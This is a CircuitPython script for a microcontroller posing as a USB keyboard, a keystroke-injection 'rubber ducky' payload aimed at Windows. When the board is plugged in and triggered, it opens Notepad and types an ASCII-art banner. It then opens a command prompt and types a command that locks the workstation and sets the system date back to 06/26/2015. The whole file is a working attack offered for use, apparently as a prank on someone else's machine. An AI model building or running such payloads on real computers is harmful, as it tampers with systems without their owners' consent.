import time
import board
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode
from digitalio import DigitalInOut, Direction, Pull

operating_system = 1
payload = 0

button = DigitalInOut(board.D2)
button.direction = Direction.INPUT
button.pull = Pull.UP
led = DigitalInOut(board.D13)
led.direction = Direction.OUTPUT

kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(kbd)

payload_delivered = 0
time.sleep(2)
print("Ready.")
pause = 0.25
def notepad():
    if operating_system is 1:
        led.value = False
        kbd.press(Keycode.GUI)
        kbd.release_all()
        time.sleep(pause)
        layout.write("notepad")
        time.sleep(pause)
        kbd.press(Keycode.ENTER)
        time.sleep(pause)
        kbd.release_all()
        layout.write("  _     ____ ____ _____ ___ \n")
        layout.write(" | |   / ___| __ )_   _/ _ \   _ \n")
        layout.write(" | |  | |  _|  _ \ | || | | |_| |_ \n")
        layout.write(" | |__| |_| | |_) || || |_| |_   _| \n")
        layout.write(" |_____\____|____/ |_| \__\_\ |_| \n")
        layout.write("\n")
        layout.write("  ____  ___ ____ _   _ _____ ____  _ \n")
        layout.write(" |  _ \|_ _/ ___| | | |_   _/ ___|| | \n")
        layout.write(" | |_) || | |  _| |_| | | | \___ \| | \n")
        layout.write(" |  _ < | | |_| |  _  | | |  ___) |_| \n")
        layout.write(" |_| \_\___\____|_| |_| |_| |____/(_) \n")
        layout.write("\n")
        layout.write("   ____ _               _     __   __ \n")
        layout.write("  / ___| |__   ___  ___| | __ \ \ / /__  _   _ _ __ \n")
        layout.write(" | |   | '_ \ / _ \/ __| |/ /  \ V / _ \| | | | '__| \n")
        layout.write(" | |___| | | |  __/ (__|   <    | | (_) | |_| | |  _ \n")
        layout.write("  \____|_| |_|\___|\___|_|\_\   |_|\___/ \__,_|_| ( ) \n")
        layout.write("                                                  |/  \n")
        layout.write("  ____        _         _ \n")
        layout.write(" |  _ \  __ _| |_ ___  | |    _ __ ___   __ _  ___ \n")
        layout.write(" | | | |/ _` | __/ _ \ | |   | '_ ` _ \ / _` |/ _ \ \n")
        layout.write(" | |_| | (_| | ||  __/ | |___| | | | | | (_| | (_) | \n")
        layout.write(" |____/ \__,_|\__\___| |_____|_| |_| |_|\__,_|\___/ \n")
        kbd.press(Keycode.ENTER), kbd.release_all()

def locksystem():
        time.sleep(pause)
        kbd.press(Keycode.GUI)
        kbd.release_all()
        time.sleep(pause)
        layout.write("cmd")
        time.sleep(pause)
        kbd.press(Keycode.ENTER)
        kbd.release_all()
        time.sleep(0.5)
        layout.write("Rundll32.exe user32.dll,LockWorkStation & date 06/26/2015 & exit")
        kbd.press(Keycode.ENTER), kbd.release_all()

while True:
    if button.value is True and payload_delivered is 0:
        print("Release the water fowl!") # A for debugging in screen or putty
        if payload is 0:
            notepad()
            locksystem()
            payload_delivered = 1
    if payload_delivered is 1:
     sys.exit()
